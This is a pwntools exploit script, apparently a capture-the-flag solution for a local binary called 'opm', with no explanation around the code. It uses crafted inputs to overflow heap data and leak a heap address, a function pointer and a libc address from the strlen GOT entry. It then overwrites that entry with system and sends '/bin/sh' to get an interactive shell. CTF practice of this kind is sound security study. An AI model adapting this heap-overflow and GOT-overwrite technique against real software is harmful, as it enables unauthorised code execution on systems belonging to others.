#!/usr/bin/env python
from pwn import *
context.log_level="debug"
context.terminal = ['gnome-terminal','-x','sh','-c']
p = process('./opm')
elf = ELF('./opm')
def add(name,n):
        p.recvuntil("(E)")
        p.sendline("A")
        p.recvuntil("name:")
        p.sendline(name)
        p.recvuntil("punch?",timeout=1)
        p.sendline(str(n))
def show():
        p.recvuntil("(E)")
        p.sendline("S")
#part one 
add('a'*0x40, 6)
add('b'*0x28+'qtsqtshh'*2+'b'*0x48+'\x50',7)

add('c'*0x80,'7'+'c'*0x7f+'\x50')
p.recvuntil("qtsqtshhqtsqtshh")
recv = p.recv(6)
heap = u64(recv.ljust(8,"\x00"))
log.info("heap: %s" % hex(heap))


#part two
gdb.attach(p)  
add('d'*8+p64(heap+0x90),str(131489).ljust(0x80,"d") + p64(heap + 0xc0))
p.recvuntil('<')
func = u64(p.recv(6).ljust(8,"\x00"))
log.info("function pointer: %s" % hex(func))

#part threee
base = func-0xb30
strlen_got = base + elf.got['strlen']
add('e'*8 + p64(strlen_got), str(131489-0x30-0x20).ljust(0x80,'s') + p64(heap + 0xc0 + 0x30 + 0x20))
p.recvuntil('<')
strlenadd = u64(p.recv(6).ljust(8,"\x00"))
print hex(strlenadd)

#part four
system = strlenadd-0x46390
add('U'*0x10, str(system & 0xffffffff).ljust(0x80,'h') + p64(strlen_got-0x18))
add('/bin/sh\x00',5)
p.interactive()

